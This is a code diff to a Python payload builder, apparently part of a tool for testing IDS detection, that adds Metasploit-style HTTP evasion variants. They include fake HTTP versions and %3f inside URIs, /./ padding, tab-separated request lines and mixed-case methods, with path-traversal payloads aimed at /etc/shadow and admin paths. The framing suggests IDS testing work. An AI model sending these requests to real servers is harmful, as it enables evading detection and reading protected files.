@@ -301,6 +301,9 @@ def build_http_payload(strategy: str) -> bytes:
         variant = random.choice([
             "double_encode", "overlong_utf8", "dot_segments", "null_byte",
             "backslash", "unicode", "mixed_case_hex", "tab_in_uri",
+            # Metasploit HTTP evasion techniques (IDS-Evasion article)
+            "uri_fake_end", "uri_fake_params_start", "self_reference",
+            "method_uri_tab", "uri_version_tab", "method_case_mix",
         ])
         if variant == "double_encode":
             # %252e%252e%252f → decodes once to %2e%2e%2f → again to ../
@@ -320,9 +323,65 @@ def build_http_payload(strategy: str) -> bytes:
             uri = b"/" + (b"%u002e%u002e%u2215" * 20) + b"etc/passwd"
         elif variant == "mixed_case_hex":
             uri = b"/" + (b"%2E%2e%2F%2f" * 50) + b"secret"
-        else:  # tab_in_uri — embedded control chars
+        elif variant == "tab_in_uri":
             uri = b"/path\twith\x0bcontrol\x0cchars/" + b"A" * 100
-        return b"GET " + uri + b" HTTP/1.1\r\n" + _HOST + b"\r\n"
+        elif variant == "uri_fake_end":
+            # Metasploit HTTP::uri_fake_end — insert a fake HTTP version inside
+            # the URI. Snort's request-line tokenizer may split at the first
+            # "HTTP/" and see a truncated path + wrong version, while the
+            # server treats %20 as a literal space in the encoded URI.
+            uri = b"/page/%20HTTP/1.0/../../admin/secret"
+        elif variant == "uri_fake_params_start":
+            # Metasploit HTTP::uri_fake_params_start — %3f decodes to '?'.
+            # IDS may think query params started (stops path analysis at '?').
+            # Server decodes %3f AFTER path parsing, treating it as path char.
+            uri = b"/%3fa=benign/../../../etc/shadow"
+        elif variant == "self_reference":
+            # Metasploit HTTP::uri_dir_self_reference — /./  segments that
+            # resolve to the same directory but change the byte pattern for
+            # content-matching rules.
+            uri = b"/" + b"./" * 500 + b"admin/config"
+        else:
+            uri = None
+
+        if uri is not None:
+            return b"GET " + uri + b" HTTP/1.1\r\n" + _HOST + b"\r\n"
+
+        # Variants that modify the request-line structure itself (not just URI)
+        if variant == "method_uri_tab":
+            # Metasploit HTTP::pad_method_uri_type — TAB or multiple spaces
+            # between HTTP method and URI. Tests request-line tokenizer.
+            seps = [b"\t", b"  ", b"\t\t", b" \t ", b"\t \t"]
+            lines = []
+            for i in range(500):
+                sep = random.choice(seps)
+                lines.append(b"GET" + sep + b"/page%d HTTP/1.1\r\n" % i
+                             + _HOST + b"\r\n")
+            return b"".join(lines)
+        elif variant == "uri_version_tab":
+            # Metasploit HTTP::pad_uri_version_type — TAB between URI and
+            # HTTP version string. Tests if tokenizer requires exactly one space.
+            seps = [b"\t", b"\t\t", b" \t", b"\t "]
+            lines = []
+            for i in range(500):
+                sep = random.choice(seps)
+                lines.append(b"GET /page%d" % i + sep + b"HTTP/1.1\r\n"
+                             + _HOST + b"\r\n")
+            return b"".join(lines)
+        else:  # method_case_mix
+            # Metasploit HTTP::method_random_case — mixed casing of known
+            # methods. Tests whether http_inspect normalises method case
+            # before rule matching via the http_method buffer.
+            methods = [b"GET", b"POST", b"PUT", b"DELETE", b"HEAD", b"OPTIONS"]
+            lines = []
+            for i in range(500):
+                m = bytearray(random.choice(methods))
+                for j in range(len(m)):
+                    if random.random() < 0.5:
+                        m[j] = m[j] ^ 0x20  # toggle case
+                lines.append(bytes(m) + b" /p%d HTTP/1.1\r\n" % i
+                             + _HOST + b"Content-Length: 0\r\n\r\n")
+            return b"".join(lines)
 
     elif strategy == "pipeline_flood":
         # Hundreds of complete, pipelined requests in a single TCP session.
